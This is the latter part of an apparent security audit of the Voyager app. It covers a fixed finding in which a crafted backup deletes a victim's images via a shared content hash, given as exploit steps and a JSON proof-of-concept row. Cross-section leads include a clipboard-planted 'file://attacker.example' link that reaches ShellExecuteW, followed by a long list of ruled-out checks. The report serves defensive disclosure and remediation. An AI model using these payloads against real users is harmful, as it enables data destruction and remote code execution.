  - Optionally, clear or scope local data when the signed-in uid changes.
  - Check `sha256(bytes) == contentHash` before `writeBytes` on download.

### [LOW] Crafted backup can delete a live image's blob locally and in Storage via a shared `contentHash` — Section 7
- Status: FIXED. `purgeExpired` skips the local and Storage delete for any hash a surviving row still claims (`lib/core/media/media_service.dart`). This also fixes the non-malicious two-device case. Test: `test/media_transfer_test.dart` ("keeps a blob another row still claims by hash"), which fails without the fix.
- Class: Authorization / integrity (content-addressed delete without a refcount check)
- Location: `lib/core/media/media_service.dart:634-656`; `lib/data/repositories/drift_repositories.dart:3972-3999`
- Exploit path:
  1. The attacker computes `H`, the `contentHash` of an image the victim has attached. Ingest is a deterministic pure-Dart decode → resize → re-encode → `sha256` (`lib/domain/services/media_ingest.dart:187-218`), so anyone holding the source image (e.g. one they sent the victim) gets the same `H`.
  2. They hand the victim a backup zip whose `media_assets` collection holds a single row with a **new id**, `contentHash: H`, `mimeType: image/jpeg`, and `deletedAt` (or `unreferencedAt`) more than 30 days in the past.
  3. Restore merges rather than replaces, so a one-row backup is enough (`lib/features/settings/services/data_import_service.dart:137-156`). The row goes through `mergeMediaAssetFromRemote`, which, because there is no local row, sets `uploadState: uploaded` and keeps the backup's `deletedAt`/`unreferencedAt` (`lib/core/sync/firestore_document_mapper.dart:931,934,941`; `backup_collections.dart:1079-1083`). Nothing enforces one row per hash, since `idx_media_assets_content_hash` is not unique (`lib/data/database/app_database.dart:1601`). The row is then pushed to `users/<victimUid>/media_assets` and reaches the victim's other devices.
  4. On the next startup purge (`lib/app/providers.dart:841`), `purgeExpiredDeleted` selects the row by its own clocks only (`drift_repositories.dart:3987-3993`). It doesn't check whether a live row shares `H`.
  5. `purgeExpired` then calls `deleteBytesForAsset`, which deletes `<app data>/media/H.jpg` (`media_service.dart:637` → `media_file_store.dart:91-96`), and, since `uploadState == uploaded`, `storage.delete('users/<victimUid>/media/H')` (`media_service.dart:643-647`).
  6. The victim's own live asset for `H` now has no local file and no Storage object. Every device that syncs the row repeats step 5, so the image is gone everywhere.
- Preconditions: Attacker D. The victim must restore the attacker's file, and the attacker must know the hash of a specific victim image.
- Proof of concept: the manifest lists `"collections": {"media_assets": 1}` with no `checksums`, and `media_assets.json` at the archive root (`data_import_service.dart:385-388`) contains `[{"id":"x1","data":{"contentHash":"<H>","mimeType":"image/jpeg","byteSize":1,"width":1,"height":1,"deletedAt":"2020-01-01T00:00:00Z","updatedAt":"2020-01-01T00:00:00Z","version":1}}]`. Restore it, then relaunch. The rest of the manifest fields weren't checked; copy them from a real export.
- Fix: in `purgeExpired`, skip the local and remote delete when any remaining row (live or not yet expired) has the same `contentHash`. The orphan sweep (`media_service.dart:660-670`) already collects that set. The same check fixes the non-malicious case where two devices ingest the same image independently.

## Cross-Section Leads

Format: `- [→ Section N] <flow>, seen at file:line (from Section M).`
Append `→ resolved: <outcome>` when the receiving section handles it.

- [→ Section 3] Attacker A is trivially available: self-signup via `createUserWithEmailAndPassword` (`lib/data/remote/firebase_auth_repository.dart:65`) plus Google sign-in, so any stranger can call the `onCall` weather functions with their own token. Check for per-uid rate limiting or quota guarding on the OpenWeather key (backend cost). (from Section 1) → resolved: there is none. The handlers only check `request.auth` (`functions/src/index.ts:57,97,161`), with no App Check, per-uid limit or `maxInstances`. Quota or cost abuse is DoS, which is out of scope, so this is recorded in the Section 3 notes rather than as a finding.
- [→ Sections 5, 6, 7] Synced Firestore/Storage data is **not** attacker input from other users (see Ruled Out, Section 1). Treat it as untrusted only if it arrives via D (import/restore → sync → other device) or E. (from Section 1) → resolved (Section 6): the D path is real. A restore writes every record in the archive to the local DB and then pushes the changed ones to `users/<signedInUid>/...` (`data_import_service.dart:152-156,220-225`), which spreads them to the user's other devices. Their fields are only as trusted as the file the user was handed. See the Section 6 leads below.
- [→ Section 5] The local DB is not keyed by uid, and sign-out doesn't clear it. After an account switch, the outbox drains queued rows under the *new* uid (`lib/core/sync/outbox_sync_worker.dart:192,292`). Check whether a pull under the new uid can overwrite or merge the previous account's local rows in a way that matters beyond the Section 2 finding. The `syncBackfillVersion` gate is per device, not per uid (`lib/core/sync/remote_sync_service.dart:6073-6074`). (from Section 2) → resolved: nothing beyond the Section 2 finding goes *up*. Watermarks are keyed by uid (`lib/core/sync/sync_watermark_store.dart:27,36`). The backfill runs once per device and re-pushes only snippets and v1 collections (`remote_sync_service.dart:6072-6096`), so a switch doesn't bulk-upload the old account's rows. What does matter is the other direction: the pull under the new uid merges that account's documents into the shared local DB. In the login-CSRF scenario those are attacker-written. Fixed ids (`settings/app` at `firestore_sync_repository.dart:164`; `legacy-default-journal` and `legacy-default-todo-list` at `lib/core/constants/journal_constants.dart:6`, `todo_constants.dart:6`) let the attacker overwrite or tombstone the victim's matching local rows without guessing ids. See the leads below. Recorded as extra impact of the Section 2 finding, not as a separate finding.
- [→ Sections 7, 9] F is attacker-written if the Section 2 login-CSRF succeeds: the victim's device pulls `users/<attackerUid>/...` into its local DB. It stays there after the victim signs back into their own account, since sign-out doesn't clear the DB. When assessing remote-sourced fields, treat this as a (LOW-precondition) attacker path alongside D. Fields that reach your sinks: media `contentHash` (`lib/core/sync/firestore_document_mapper.dart:926`) → local and Storage paths (§7). Job `applicationUrl` (`:1477`) and settings `jobProfileLinkedInUrl`/`GitHubUrl`/`PortfolioUrl` (`:3841-3846`) → `launchUrl` (§9). Settings `leetcodeUsername` (`:3847`) → LeetCode GraphQL (§9). (from Section 5) → resolved (Section 9): `applicationUrl` → `launchUrl` is exploitable; see the Section 9 finding. The profile URLs are copy-to-clipboard only (`lib/features/jobs/jobs_header.dart:447-452`), never launched. `leetcodeUsername` goes only into a GraphQL variable (`lib/data/remote/leetcode_api_client.dart:61-72`), with no injection. See Ruled Out.
- [→ Final Consolidation] When consolidating, add the Section 5 pull-side impact to the Section 2 login-CSRF finding. The attacker's fixed-id `settings/app` and legacy journal/todo-list docs merge into the victim's local DB (integrity loss), and attacker-chosen URLs and `contentHash` values reach the victim's device. (from Section 5) → resolved (Final Consolidation): confirmed, and merged into the Section 2 finding (now "Sections 2, 5, 7").
- [→ Section 7] A crafted backup (attacker D) restores `media_assets` rows with any `contentHash` and `mimeType` (`lib/features/settings/services/backup_collections.dart:1079-1083` → `firestore_document_mapper.dart:926-928`). These rows then sync to the user's other devices. Local cache paths are safe, because `MediaFileStore` checks `^[A-Za-z0-9_-]+$` in `fileFor`, `fileForAsset` and `writeBytes` (`lib/data/services/media_file_store.dart:47,56,93,206`). Still to check: the Storage `remotePath` (`lib/domain/models/media_models.dart:112`) and any download or upload path that uses `contentHash` *without* going through `MediaFileStore`, plus whether a `contentHash` with `/` or `..` changes the Storage object reached (the rules pin only the uid prefix). (from Section 6) → resolved: no path escape. A restored or synced `contentHash` never reaches the disk outside `MediaFileStore`. On upload, `readBytes` returns null for a non-bare hash, so nothing is sent (`lib/core/media/media_transfer_worker.dart:206-215`). On download, `remotePath` may carry `/` or `..`, but it stays under `users/<signedInUid>/`, and the rules allow only `users/{uid}/media/{single segment}` (`storage.rules:10,25-26`). `writeBytes` then throws on the non-bare name (`transfer_worker.dart:269`). One shared-hash delete issue was found instead; see the Section 7 finding.
- [→ Final Consolidation] Add to the Section 2 login-CSRF finding: downloaded blobs aren't hash-verified (`lib/core/media/media_transfer_worker.dart:268-269`), and `writeBytes` overwrites an existing file whose length differs (`lib/data/services/media_file_store.dart:83-86`). While the victim is signed in as the attacker, an attacker asset row with `contentHash` = one of the victim's hashes causes the attacker's image bytes to be written over the victim's local blob. That blob persists after sign-back. Fix: check `sha256(bytes) == contentHash` before `writeBytes`. (from Section 7) → resolved (Final Consolidation): confirmed at `media_transfer_worker.dart:268-269` (download → `writeBytes`, no hash check) and `media_file_store.dart:83-86`, and merged into the Section 2 finding.
- [→ Section 9] Attacker D reaches the same URL sinks as the Section 5 lead, with no login-CSRF needed. A restored backup sets job `applicationUrl` (via `mergeJobApplicationFromRemote`, `backup_collections.dart:999`) and settings `jobProfile*Url`/`leetcodeUsername` (via `mergeSettingsFromRemote`, `data_import_service.dart:169-177`). Both then push to Firestore and reach the user's other devices. Rate any `launchUrl` scheme issue with D as the source, not only F. (from Section 6) → resolved (Section 9): confirmed with D as the source; see the Section 9 finding. The settings URLs and `leetcodeUsername` reach no dangerous sink (see Ruled Out).
- [→ Section 10] Attacker D can restore arbitrary `scheduled_reminder_rules`, `entity_reminders`, `reminder_delivery_*`, `device_registrations`, `pinned_notes` and `dismissed_notifications` rows (`backup_collections.dart:814-920`), which then sync to every device. Check whether any of their fields become a notification payload that the tap handler acts on (route, URL, file path, command), or whether a device-registration row can make another device act. (from Section 6) → resolved: no dangerous sink. Reminder fields reach the OS only as toast title/body text and a `sourceKey` payload (`lib/core/reminders/reminder_os_notifier.dart:197-227`). On Windows, `flutter_local_notifications_windows` builds the toast with `XmlBuilder`, which escapes text and attributes (`flutter_local_notifications_windows-3.1.1/lib/src/details/notification_to_xml.dart:17-44`), so no `<action>` or protocol activation can be injected. A tap only passes the payload to `ReminderEngine.focus`, which records which sticky to bring forward (`lib/app/voyager_app.dart:66-70,119-124`; `lib/core/reminders/reminder_engine.dart:123-127`). Notification and sticky navigation goes to constant routes (`lib/features/notifications/notification_inbox_popover.dart:138-150,1427-1446`; `reminder_sticky_stack.dart:182,190`). Device-registration rows only decide whether *this* device delivers a rule (`reminder_engine.dart:179,207,236`), so a crafted row can at most suppress reminders, which is integrity of the user's own reminder list, not an exploit. Pinned-notes and dismissed-notification rows are display state only.
- [→ Final Consolidation] Add a second source to the Section 9 `applicationUrl` finding, one that needs no backup file. Opening the Jobs "Track" form reads the clipboard automatically (`lib/features/jobs/jobs_track_modal.dart:308,319-334`) and fills an empty URL field. `parseJobClipboard` accepts a whole-string markdown link `[Title](<any-scheme>://…)` (`lib/features/jobs/job_clipboard_parser.dart:25,86-92`), and `normalizeJobUrl` keeps any existing scheme (`:56,128-131`). A web page that overwrites the clipboard on copy can therefore plant `[Senior SWE](file://attacker.example/s/Offer.lnk)`. The victim opens Track, sees Title and URL pre-filled with a "From clipboard" chip, and saves (`jobs_track_modal.dart:514`). Clicking "Open" later reaches the same `ShellExecuteW` sink. This needs more user interaction than the backup path (the URL is visible in the form before saving), so it doesn't raise the severity. The Section 9 fix (http/https allow-list at launch) covers it; optionally also have `normalizeJobUrl` reject non-http(s) schemes. (from Section 12) → resolved (Final Consolidation): confirmed at `job_clipboard_parser.dart:25,86-92,128-131`, and merged into the Section 9 finding (now "Sections 9, 12").

## Ruled Out

Format: `- <pattern checked> — safe because <reason>, verified at file:line (Section N).`

- Cross-user Firestore read/write (attacker A) — safe because all three matches require `request.auth.uid == userId` (`firestore.rules:5,10-12,17`). Nothing matches top-level collections, the `users/{uid}` doc itself, or depth > 2 subcollections, so those are default-denied. Result for later sections: **remote documents are owner-written only; F is not an independent attacker** (Section 1).
- Client writes to server-owned `users/{uid}/weather/{doc}` — safe because `firestore.rules:6` denies writes, and `firestore.rules:13` excludes `weather` from the generic match (Firestore ORs matches, and neither grants). The subcollection match `users/{uid}/weather/{doc}/{sub}/{subdoc}` (`firestore.rules:16-17`) *is* owner-writable, but Functions only read `users/${uid}/weather/forecast` itself (`functions/src/forecast_archive.ts:100`), never subcollections. So the only effect is on the owner's own data (Section 1).
- Functions writing weather under a caller-chosen uid — safe because uid comes from `request.auth.uid` (`functions/src/index.ts:137,182`) (Section 1; Section 3 may go deeper).
- Client path construction escaping the uid (`'users/$_userId/$collection/$id'`, `lib/data/remote/firestore_sync_repository.dart:48`; `outbox_sync_worker.dart:292`) — the server enforces the boundary regardless. Any path whose `userId` segment isn't the caller's uid is denied by the rules, and extra segments from an `id` containing `/` stay under the caller's own prefix (Section 1).
- Cross-user Storage access / non-image hosting — safe because read, write and delete all require `request.auth.uid == userId` (`storage.rules:11,16-17,21`), and writes need size < 10 MB plus `image/*` (`storage.rules:18-19`). Everything else is denied (`storage.rules:25-26`). `image/svg+xml` is allowed but only readable by the owner. `remotePath` is built from the signed-in uid (`lib/domain/models/media_models.dart:112`) (Section 1).
- OAuth loopback response injection — safe because the reply is a fixed HTML string with no request data echoed into the body or headers (`lib/data/remote/desktop_google_oauth.dart:78-83`) (Section 2).
- OAuth code theft via PKCE/verifier weakness — safe because `oauth2` 2.0.5 always sends an S256 `code_challenge`, with a 128-char verifier from `Random.secure()` (`oauth2-2.0.5/lib/src/authorization_code_grant.dart:194-205,333-335`) (Section 2).
- Loopback port hijack by pre-binding 4285 — safe: the port is bound before the browser opens, and a bind failure throws before `launchUrl`, so no code is ever sent to a squatter (`desktop_google_oauth.dart:56-69`). Windows also blocks a different account from `SO_REUSEADDR`-binding over an existing socket. A same-user process already has the user's full file access. Not verified: whether Dart's `shared: true` (`:59`) sets `SO_REUSEADDR` on Windows (Section 2).
- Route guard bypass — irrelevant to security: `app_router.dart:81-84` is UI-only, and server-side access is enforced by the rules (Section 1) (Section 2).
- Patched plugin `ReauthenticateWithCredential` — safe: it only swaps upstream's `Reauthenticate()` for `ReauthenticateAndRetrieveData()` so the future completes, and verification stays server-side (`third_party/firebase_auth-6.5.3/windows/firebase_auth_plugin.cpp:1192-1215`). `changePassword` reauthenticates with the current password before `updatePassword` (`lib/data/remote/firebase_auth_repository.dart:40-43`) (Section 2).
- Patched plugin's message-only dispatcher window (`WM_APP+0x4175`) — safe: posting that message from another process only makes the plugin drain its own internal task queue, and it carries no payload (`firebase_auth_plugin.cpp:64-100`) (Section 2).
- Account switch showing user A's local data to user B on the same Windows account — not a boundary: anyone on that Windows account can already read `voyager.sqlite` directly. The one cross-account impact is the Section 2 login-CSRF finding (Section 2).
- Firebase token storage — the Firebase C++ SDK persists the refresh token in the Windows user's profile. Voyager adds no token file or logging of tokens in the auth paths reviewed (`firebase_auth_repository.dart`, `desktop_google_oauth.dart`) (Section 2).

- Unauthenticated calls to the weather functions — safe: all three `onCall` handlers reject calls without `request.auth` (`functions/src/index.ts:57-59,97-99,161-163`) (Section 3).
- IDOR via caller-supplied uid in Functions — safe: every Firestore path uses `request.auth.uid` (`functions/src/index.ts:137-139,182`; `functions/src/forecast_archive.ts:100,121,135`). Nothing in `request.data` reaches a document path (Section 3).
- Parameter injection / `appid` override / SSRF in OpenWeather URLs — safe: the host is a fixed literal, and `query` goes through `encodeURIComponent` (`functions/src/index.ts:66-70`). `lat`, `lon` and `timeZoneOffsetMinutes` must be `typeof "number"` (`:103,167,175`), so their string forms can't contain `&` or `#`. Caller-controlled `locationLabel`, `deviceId` and `resetArchive` never reach a URL (Section 3).
- OpenWeather key leaking through Function errors — safe as far as this code goes: `HttpsError` details carry only OpenWeather's own `message` or a fixed string (`functions/src/index.ts:30-51`). Any other thrown error is masked as `INTERNAL` by `onCall`, and the key is never logged or returned. Not verified: whether OpenWeather ever echoes request params in `message` (Section 3).
- Unvalidated `locationLabel`/`deviceId` types (any JSON value) written by Functions — only reach the caller's own `users/{uid}/weather/*` docs (`functions/src/index.ts:107-109,138-151`; `forecast_archive.ts:120-131`), which is self-harm. The `periods` map keys come from `forecastBucketKey` (`forecast_archive.ts:50-61`), never from the caller, so there is no prototype-key injection (Section 3).
- Desktop HTTPS callable client sending the ID token elsewhere — safe: the URL is built from the compiled-in `projectId` and a fixed region (`lib/data/remote/http_callable_client.dart:23-24`; `lib/app/providers.dart:556-559`) over HTTPS. The token only goes to `cloudfunctions.net` (Section 3).
- Dev OpenWeather key in release binaries — safe: the direct client runs in release only when built with `USE_CLOUD_FUNCTIONS=false` plus `OPENWEATHER_API_KEY` (`lib/app/providers.dart:545-554`). `scripts/build_release.ps1:16-18` passes neither, and `dart_defines.json` has only the OAuth keys. The in-app dev key setting is `kDebugMode`-only and stays in the local DB (it is not in the sync mapper). The dev client builds URLs with `Uri.https` query maps (`lib/data/remote/dev_openweather_client.dart:24-28`) (Section 3).
- Committed secrets (OAuth client secret, OpenWeather key, service-account JSON, private keys, GitHub/Slack/Anthropic tokens), now or ever — none. The only key-shaped strings in all history are the two Firebase API keys, added in `e811855` (`lib/firebase_options.dart:53,61`; `android/app/google-services.json`). `GOOGLE_OAUTH_CLIENT_SECRET` and `OPENWEATHER_API_KEY` are only ever read via `String.fromEnvironment` (`lib/core/constants/google_auth_config.dart`; `lib/app/providers.dart:105`). `dart_defines.json` and `.env` are gitignored (`.gitignore:13-14`), as are `key.properties`, `*.jks` and `*.keystore` (`android/.gitignore`). None of them were ever committed. `google-services.json` has no `oauth_client` entries (Section 4).
- Firebase API keys in the repo — public by design. Section 1 found no rules gap to pair them with (`firestore.rules`, `storage.rules`), so shipping them grants nothing beyond what any app install has (Section 4).
- Secrets in UTF-16/binary files that text scans skip — `run_log.txt` (UTF-16, one commit `8d27589`) is a debug build/link log with no tokens, JWTs, emails, uids or keys. The historical blobs of `test.dart`, `lib/domain/jobs/job_queries.dart` and `test/vim_session_test.dart` were decoded and are clean (Section 4).
- Command injection in `scripts/build_release.ps1` — values interpolated into commands come only from the repo's own `pubspec.yaml` and `git rev-parse` (`scripts/build_release.ps1:8-18`). Anyone who controls those can already change the code being built, so there's no boundary crossed (Section 4).
- CI workflow abuse — `.github/workflows/ci.yml` runs on `pull_request` (not `pull_request_target`), references no secrets, and interpolates no `${{ github.event.* }}` into `run:` steps (`ci.yml:3-20`) (Section 4).
- Agent hooks (`.codex/hooks.json`, `.cursor/hooks.json`, `.github/hooks/impeccable.json`) — the first two run fixed scripts from the user's own home dir. The Copilot one runs `.github/skills/impeccable/scripts/hook.mjs` from the checkout, which doesn't exist (`.github/hooks/impeccable.json:8`). A PR could add it, but a PR can equally change the code that tests/build_runner execute, so it is the same trust level (Section 4).
- Remote paths built from document data in the sync pipeline — safe: every `_firestore.doc`/`collection` call interpolates the signed-in uid (`lib/data/remote/firestore_sync_repository.dart:48,52,164,201-324`; `lib/core/sync/outbox_sync_worker.dart:192,292`). Document ids only fill the last segment, via `firestoreDocumentIdForLocal` (`lib/core/sync/firestore_document_mapper.dart:46-59`), and the rules pin the prefix anyway (Section 5).
- SQL/file/process sinks in the sync pipeline — none. A grep of `lib/core/sync/**`, `firestore_sync_repository.dart`, `in_memory_sync.dart` and `lib/features/sync/**` for `customStatement|customSelect|customUpdate|Process.|File(|Directory(|launchUrl|Uri.parse|http.` finds no hits. Local writes go through Drift companions/`delete()..where` (e.g. `outbox_sync_worker.dart:803,904`), which are parameterized. Remote document ids decoded by `decodeDocumentId` (`firestore_document_mapper.dart:2204`; `remote_sync_service.dart:3241-3256`) become Drift column values only (Section 5).
- Unsafe deserialization of remote/conflict payloads — safe: `jsonDecode` produces plain maps (`crdt_document_resolver.dart:32`; `remote_sync_service.dart:566,4728`; `lib/features/sync/sync_conflict_banner.dart:489`). The mapper reads fields with `as` casts into fixed model constructors. There's no type-name dispatch or reflection, so a bad type only throws (Section 5).
- Synced settings reaching dangerous local config — safe: `settingsToFirestore` and `mergeSettingsFromRemote` carry only UI, hotkey, theme and profile fields (`firestore_document_mapper.dart:3656,3667`). There is no backup directory, launch-at-login, file path or dev API key among them. `customStartupPage` (`:3835`) only feeds go_router navigation. URL and LeetCode fields are handed to Section 9 (Section 5).
- Zip-slip / path traversal on import and restore — safe: nothing is extracted to disk by entry name. `extractBackupIsolate` reads members into memory by `findFile` (`lib/features/settings/services/data_import_service.dart:336-340,386-398`). `media/` members are keyed in a map only (`:378-383`). `_restoreMediaBlobs` writes bytes only for an existing asset row whose `contentHash` equals `sha256(bytes)`, which forces 64 hex chars (`:258-268`), and `MediaFileStore.writeBytes` rechecks the bare name (`lib/data/services/media_file_store.dart:93`). Manifest `collections` keys and `checksums` keys only feed in-archive `findFile` lookups (`data_import_service.dart:368,388`) (Section 6).
- Auto-backup file handling (listing, rename, delete, retention) reached by planted files — safe: only names that fully match `^voyager_(auto|prerestore)_<stamp>\.zip$` are listed or touched (`auto_backup_service.dart:268-289`; `auto_backup_retention.dart:27,30`). Renames append a fixed suffix or use a name rebuilt from parsed digits (`auto_backup_service.dart:180-189,376,379`; `auto_backup_retention.dart:65-76`). Every path is `p.join(backupsDir, <our name>)`, and the directory is the app-support dir, never a setting. `state.json` holds only booleans, timestamps and display strings (`auto_backup_service.dart:203-236`) (Section 6).
- Imported records pushed to another user's Firestore space — not possible: `pushRestoredRecords` and `pushSettings` go through the sync repository, whose paths use the signed-in uid (`lib/core/sync/remote_sync_service.dart:5238`; op-log wipe via uid-scoped `_collection('sync_operations')`, `lib/data/remote/firestore_sync_repository.dart:545-548`). The rules pin the prefix anyway (Section 1) (Section 6).
- Unsafe deserialization of backup JSON — safe: `jsonDecode` to plain maps (`data_import_service.dart:339`), then `BackupRecord.fromJson` with `as` casts (`backup_collections.dart:21-24`) and the same `mergeXFromRemote` mappers as sync (Section 5 Ruled Out). Collections not in the fixed list are ignored (`data_import_service.dart:138-143`) (Section 6).
- Settings restored from a backup reaching dangerous local config — same result as Section 5: restore goes through `mergeSettingsFromRemote` (`data_import_service.dart:169-177`), which carries no path, backup-dir, launch-at-login or dev-key field. Legacy snippets go through `upsertSnippetRecord`/`upsertJobExperienceSnippetRecord` Drift writes (`:182-201`) (Section 6).
- Calendar event import (`lib/domain/services/calendar_event_import.dart:112-262`) and the palette codec (`lib/domain/services/color_palette_codec.dart:13-58`) — pure parsers. Output is typed strings, dates, ints and an enum with a closed field allow-list (`calendar_event_import.dart:59-69,188-190`). No file, process, URL or SQL sink (Section 6).
- Export / "Save a copy" / "Show in folder" — the destinations come from the user's own OS save dialog (`settings_page.dart:792-807`; `backup_list_dialog.dart:139-147`). `Process.run('explorer', [dir.path])` passes the fixed backups dir as a single argv element (`backup_list_dialog.dart:130-131`). No attacker input is involved (Section 6).
- Command injection in `MediaFileStore._volumeStats` — safe: both `Process.run` calls pass an argv list. The only interpolated value is the drive letter of the app data dir (`p.rootPrefix`), never a setting or synced field (`lib/data/services/media_file_store.dart:142-143,173-181,193`) (Section 7).
- Local path traversal via `contentHash` — safe: every file operation goes through `fileFor`, which requires `^[A-Za-z0-9_-]+$` (`media_file_store.dart:46-51,56,93,206`). The format extension comes from a closed enum (`lib/domain/models/media_models.dart:36-51`). The orphan sweep lists with `followLinks: false` and only deletes files (`media_file_store.dart:123-131`) (Section 7).
- Paste/drop/picker reading arbitrary files for upload — safe: clipboard and drop read only image-format data via `super_clipboard` (`lib/core/media/media_clipboard.dart:44-49,83-92`; `widgets/media_drop_target.dart:66-71`). Pasted text is never treated as a path. The file picker reads only the file the user chose (`widgets/media_attach.dart:115-128`). Every input is decoded and re-encoded before storage or upload (`lib/domain/services/media_ingest.dart:187-218`), so only pixels leave the device (Section 7).
- Lightbox "Save image" — the destination is the user's own save dialog. The attacker-influenced part is only the 8-char `contentHash` prefix in the suggested name (`widgets/media_lightbox.dart:341-350`) (Section 7).
- Storage upload of foreign content types — `mimeType` is sent as `contentType`, but the rules accept `image/*` only (`storage.rules:19`), and downloads must map to jpeg/png/webp (`media_transfer_worker.dart:249-258`) (Section 7).
- SQL injection via raw SQL in repositories — safe: all seven `customUpdate`/`customSelect` sites bind every value with `?` + `Variable` (`lib/data/repositories/drift_repositories.dart:131,159,191,3762,3891,5001,6307`). The only interpolation is `table.actualTableName` from generated table info (`:6371-6372`). The single `LIKE` is the literal `'seed-%'` (`:7019,7026`). Everything else is typed Drift builders (Section 8).
- SQL injection via identifier interpolation in migrations — safe: `$table`, `$tableName`, `$columnName`, `$seedFrom`, `$target`/`$legacy` and `$column` are all string literals at their call sites or in const loops (`lib/data/database/app_database.dart:2691-2750,3158-3170,3248-3250,3599-3608,3838-3866`). `$kDefaultMood` in `kJournalMoodBackfillSql` is `const int 5` (`lib/domain/models/journal_models.dart:8`). Row data the migrations read (`id`, snippet JSON, legacy LeetCode fields) goes back through `?` binds or Drift companions (`app_database.dart:3389-3439,3540-3564,3581-3584,3687-3696`). Migrations run only on schema upgrade, not on restore or pull (Section 8).
- Search / LIKE / FTS injection — none possible: there is no FTS table or `MATCH`, and search text never reaches SQL. The Search page filters loaded entries in Dart (`lib/features/search/dream_search.dart:46-67`; `search_page.dart:929-930`) (Section 8).
- DB file location / connection setup — the path is fixed at `<appDataDirectory>/voyager.sqlite`, and the only `execute` is a constant `PRAGMA busy_timeout` (`app_database.dart:4138-4153`). Directory permissions belong to Section 10 (Section 8).
- Job profile URLs (`jobProfileLinkedInUrl`/`GitHubUrl`/`PortfolioUrl`) from sync or restore — never launched. The header's buttons only copy the string to the clipboard (`lib/features/jobs/jobs_header.dart:76-95,447-452`) (Section 9).
- LeetCode `launchUrl` sites (`leetcode_detail_view.dart:303`, `leetcode_actions.dart:312`, `leetcode_scratch_pad.dart:71,386`) — safe: `leetcodeUrl` is always `https://leetcode.com/problems/<slug>/`, where the slug is the title reduced to `[a-z0-9-]` (`lib/domain/models/leetcode_models.dart:190-193,329-334`). The progress-ring and settings links are constants (`leetcode_progress_rings.dart:56,79`; `settings_page.dart:900-901`) (Section 9).
- GraphQL injection via `leetcodeUsername`, search text or `titleSlug` — safe: every query is a constant string, and caller data travels only in `variables`, serialized with `jsonEncode` (`lib/data/remote/leetcode_api_client.dart:61-72,87-102,120-141,216-222`). The endpoint is a fixed HTTPS literal (`:26`) (Section 9).
- LeetCode `content` HTML (attacker E) — safe: it is stripped to plain text by regex (`lib/data/remote/leetcode_content.dart:92-110`) and stored as description/example strings. No HTML renderer, WebView or link recognizer exists in the app (none in `pubspec.yaml`; no `TapGestureRecognizer`/`launch` in `lib/core/text/**`, `lib/features/leetcode/**`, `lib/features/jobs/**`). An error message that embeds `errors` only reaches a thrown `Exception` (`leetcode_api_client.dart:230-231`) (Section 9).
- Pasted rich HTML (`lib/core/text/html_to_markers.dart`, via `prose_paste.dart`) — reduced to text plus four style markers, and links become their label (`html_to_markers.dart:1-10`). No URL or file sink (Section 9).
- Quotes loader — reads a bundled asset only (`lib/data/services/quotes_loader.dart:7`) (Section 9).
- Broadcast window messages `Voyager.ShowMainWindow`/`Voyager.Quit` — carry no payload, and they only show or quit the app (`windows/runner/flutter_window.cpp:35-36,78-85`; `lib/app/voyager_app.dart:84-90`). Window messages don't cross sessions, and UIPI blocks lower-integrity senders, so the only possible senders are same-user processes, which already have full access. Quit-on-demand is DoS, which is out of scope (Section 10).
- Single-instance mutex squatting (`Local\Voyager.SingleInstance`, `windows/runner/main.cpp:16-21`) — `Local\` is per session, so only a same-session process can pre-create it. The effect is that Voyager won't start (DoS) (Section 10).
- Command-line arguments — Dart only checks for `--hidden` (`lib/main.dart:36`; `windows/runner/main.cpp:39-41`). No other argument is parsed or acted on (Section 10).
- Launch-at-login Run value — written under HKCU with the executable path quoted (`lib/core/platform/launch_at_login.dart:19,42-56`), so there's no unquoted-path hijack. The path comes from `Platform.resolvedExecutable`, not from a setting or synced data (Section 10).
- App data dir planting — the directory is `%APPDATA%\Voyager\voyager` (per-user ACL) (`lib/core/platform/app_data_directory.dart:8-10`). The one-time move reads from the user's own Documents and the legacy `com.example` folder, never overwriting (`app_data_directory.dart:68-156`). Planting in either needs the same Windows user, so no boundary is crossed (Section 10).
- Session checkpoint and quick-journal pointer files — the file name is sanitised to `[A-Za-z0-9_-]` (`lib/core/session_resume/session_checkpoint_store.dart:53-56`), or is a fixed name (`lib/features/hotkeys/quick_journal_entry.dart:33`). Contents are `jsonDecode`d into typed DTOs, with a type check or delete on failure (`session_checkpoint_store.dart:74-86`; `quick_journal_entry.dart:40-44`). They are device-local, never synced or restored (Section 10).
- Floater window enumeration — `EnumWindows` filtered to this process's own pid (`lib/features/hotkeys/floaters/floater_window.dart:546-554`). No other process's windows are acted on (Section 10).
- Android exported components — only the launcher `MainActivity`, with no data/VIEW intent filters and no custom code (`android/app/src/main/AndroidManifest.xml:9-29`; `MainActivity.kt`). A `route` extra from another app can only select a go_router page, and every route is just a page builder behind the auth redirect (`lib/routing/app_router.dart:38-95`) (Section 10).
- Android backup — Auto Backup and device transfer are on (default `allowBackup`), excluding only `files/backups/` (`android/app/src/main/res/xml/data_extraction_rules.xml`, `backup_rules.xml`). Data goes only to the user's own Google account or device. `adb backup` of a non-debuggable app is refused on Android 12+. No cross-user exposure (Section 10).
- Dev page in release builds — the `/dev` destination isn't gated on build mode (`lib/features/shell/shell_destinations.dart:136-141`), only hidden from nav by default (`lib/domain/models/settings_models.dart:20`). It's reachable only through the signed-in user's own UI, so its tools act with the user's own authority. The direct-OpenWeather key tile renders nothing outside `kDebugMode` (`lib/features/dev/dev_weather_api_tile.dart:53`) (Section 11).
- Dev remote purge / out-of-sync purge reaching other users' data — safe: `permanentlyDeleteFromRemote` goes through the sync repository's uid-scoped paths (`lib/core/sync/remote_sync_service.dart:693-709`; Section 5 Ruled Out). The out-of-sync targets are hardcoded ids, not parsed from `sync_compare.log` (`lib/core/dev/out_of_sync_journal_entry_purge.dart:20-46`). `scripts/purge_out_of_sync_journal_entries.ps1` only prints help or runs a fixed `flutter test` target (`:9-31`) (Section 11).
- Dev toggles set via sync or restore — not possible: no `dev*` field appears in `firestore_document_mapper.dart`, so `mergeSettingsFromRemote` can't turn on debug logging or the conflict/purge UI. `DevSettingsController` loads only from the local settings row (`lib/core/dev/dev_settings_controller.dart:40-45`) (Section 11).
- Tokens or secrets in log files — none found. `ErrorLogger` writes `$error` + stack (`lib/core/dev/error_logger.dart:96-102`), and the desktop callable client's exceptions never include the ID token or headers (`lib/data/remote/http_callable_client.dart:31-77`). There is no token logging anywhere in `lib/` (grep for `idToken|accessToken|refreshToken|Authorization`). The dev OpenWeather client (whose `ClientException` could carry the `appid` URL) is debug-only (Section 3) (Section 11).
